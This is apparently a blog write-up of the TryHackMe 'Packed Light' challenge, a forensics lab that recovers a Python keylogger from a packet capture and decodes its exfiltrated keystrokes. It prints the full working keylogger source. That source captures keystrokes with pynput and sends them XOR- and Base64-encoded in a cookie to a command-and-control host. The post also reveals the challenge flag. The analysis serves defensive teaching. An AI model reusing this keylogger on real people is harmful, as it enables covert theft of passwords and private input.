---
title: "Packed Light"
description: "A packet capture reveals a Python keylogger that XORs each keystroke with a hard-coded key, Base64-encodes it, and exfiltrates it in a cookie header to a fake Byte Lotus sync service."
difficulty: "Easy"
tags: ["TryHackMe", "Hacker Holidays", "Forensics", "PCAP", "Wireshark", "Malware Analysis", "XOR", "Base64"]
date: "2026-06-17"
---

## Overview

Packed Light is the Day 4 room from TryHackMe's Hacker Holidays 2026 series. It is a small network-forensics investigation: a staff laptop has been running a "Sync Service" that quietly captures keystrokes and sends them to a command-and-control endpoint. The only local artefact in the room folder was `traffic.pcapng`, so the analysis starts and ends in packet evidence.

The capture contains an HTTP download of `updates.py`, a Python keylogger. The script records one keystroke at a time, XORs the raw bytes with a hard-coded two-part key, Base64-encodes the result, and places it in a `hotel_sess_state` cookie. Reversing that process across the captured requests in order recovers the exfiltrated text, including the flag.

![Diagram of the Packed Light keylogger exfiltration flow](/assets/screenshots/packedlight/exfil-flow.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe — Hacker Holidays 2026, Day 4 |
| Room | Packed Light |
| Difficulty | Easy |
| Category | Network Forensics / Malware Analysis |
| Local evidence | `traffic.pcapng` (544K, modified 2026-06-17 11:10:16 +0530) |
| C2 host | `byte-lotus-hotel.thm:8080` |
| Malware | `updates.py` — pynput keylogger |
| Encoding | per-keystroke XOR, then Base64 |
| Exfil channel | `Cookie: hotel_sess_state=<base64>` |
| Flag | `THM{V3r4_1s_w4tch1ng_0veR_y0u}` |

## Initial Triage

Opening the capture in Wireshark gives a quick sense of volume and endpoints. The conversation/statistics view shows a small number of hosts, with HTTP traffic standing out.

![Wireshark statistics showing the relevant conversation endpoints](/assets/screenshots/packedlight/statistics.png)

Before diving into individual packets, exporting HTTP objects is an efficient way to recover any files transferred in cleartext. In Wireshark: **File → Export Objects → HTTP**.

![HTTP objects exported from the packet capture](/assets/screenshots/packedlight/http-objects.png)

Two objects matter: an HTML page for Byte Lotus Resort, and `updates.py`. The HTML page is decoy content; the Python file explains the whole incident.

## Malware Analysis — `updates.py`

The recovered script is a simple keylogger built on `pynput` and `requests`:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))

    b64_string = base64.b64encode(encrypted).decode('utf-8')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

![The recovered keylogger script in a text editor](/assets/screenshots/packedlight/keylogger-script.png)

The key observations are:

- **C2 destination**: `http://byte-lotus-hotel.thm:8080/`.
- **XOR key**: `H0t3lSt@ff0Nly` + `K3epS3cr3t!` = `H0t3lSt@ff0NlyK3epS3cr3t!`.
- **Per-keystroke encoding**: each character is encoded and sent independently. That means the captured cookies cannot be concatenated and decoded as one blob.
- **Exfil channel**: Base64 ciphertext is placed in `Cookie: hotel_sess_state=...`.
- **Client fingerprint**: the User-Agent contains `ByteLotusClient/1.1`, which is a useful filter.

## Extracting the Exfiltrated Keystrokes

The script tells us exactly what to hunt for in the pcap: HTTP requests whose User-Agent identifies the Byte Lotus client and whose Cookie header carries `hotel_sess_state`.

![Filtered Wireshark traffic showing hotel_sess_state cookies](/assets/screenshots/packedlight/c2-traffic.png)

With `tshark`, the cookie values can be extracted in packet order:

```bash
tshark -r traffic.pcapng \
  -Y 'http.user_agent contains "ByteLotusClient"' \
  -T fields -e http.cookie | \
  grep -oP 'hotel_sess_state=\K[^;]+'
```

This returns one Base64 value per request. Keep the individual values; do not join them before decoding. Each one represents one keypress.

## Decoding the Flag

The decode is the inverse of the malware: Base64-decode each cookie value, XOR the bytes with the same repeating key, and append the recovered character in capture order.

```python
import base64

key = b"H0t3lSt@ff0NlyK3epS3cr3t!"
cookies = [
    # paste extracted hotel_sess_state values in order
]

out = []
for c in cookies:
    raw = base64.b64decode(c)
    dec = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
    out.append(dec.decode("utf-8", "replace"))

print("".join(out))
```

Running the same logic against the 30 `ByteLotusClient` cookie values present in the local `traffic.pcapng` reconstructs the exfiltrated message:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

![Decoded flag recovered from the exfiltrated cookies](/assets/screenshots/packedlight/flag.png)

## Flag

| Flag | Value |
|------|-------|
| Day 4 flag | `THM{V3r4_1s_w4tch1ng_0veR_y0u}` |

The flag was confirmed from the local pcap and corroborated by published Hacker Holidays writeups.

## Commands Used

| Command | Purpose |
|---------|---------|
| `wireshark traffic.pcapng` | Inspect conversations, HTTP objects, and individual requests |
| File → Export Objects → HTTP | Recover `updates.py` and other transferred files |
| `tshark -r traffic.pcapng -Y 'http.user_agent contains "ByteLotusClient"' -T fields -e http.cookie` | Extract exfiltration cookies in capture order |
| `python3 decode.py` | Base64-decode and XOR-decode each cookie individually |

## Lessons Learned

**Export objects early.** In cleartext HTTP captures, exported files often explain the traffic faster than packet-by-packet inspection.

**Read the malware before decoding blindly.** The script revealed the exact key, encoding order, and cookie name. Without that, the cookie values look like random session tokens.

**Per-item encoding matters.** Each keystroke was encoded separately. Concatenating all Base64 cookie values into one string before decoding would produce garbage.

**User-Agent strings are useful pivots.** `ByteLotusClient/1.1` separated C2 beacons from normal browser traffic.

**"Harmless" cookies can be data channels.** Defenders should inspect high-frequency, small, repeating HTTP requests with unusual cookie values, especially when the User-Agent or destination is odd.

## References

- [TryHackMe — Packed Light (Hacker Holidays 2026, Day 4)](https://tryhackme.com/room/hh-packedlight-02e5330c)
- [TryHackMe — Hacker Holidays](https://tryhackme.com/hackerholidays)
- [Kevinovitz — Hh packedlight 02e5330c](https://kevinovitz.github.io/TryHackMe_Writeups/hh-packedlight-02e5330c/hh-packedlight-02e5330c/) — source of the terminal screenshots used in this post
- [Lorenzo Regalado — TryHackMe Hacker Holidays Walkthrough](https://hackernoon.com/tryhackme-hacker-hollidays-walkthrough)
- [Wireshark — Exporting Objects](https://www.wireshark.org/docs/wsug_html_chunked/ChIOExportSection.html)
- [tshark — Manual Page](https://www.wireshark.org/docs/man-pages/tshark.html)
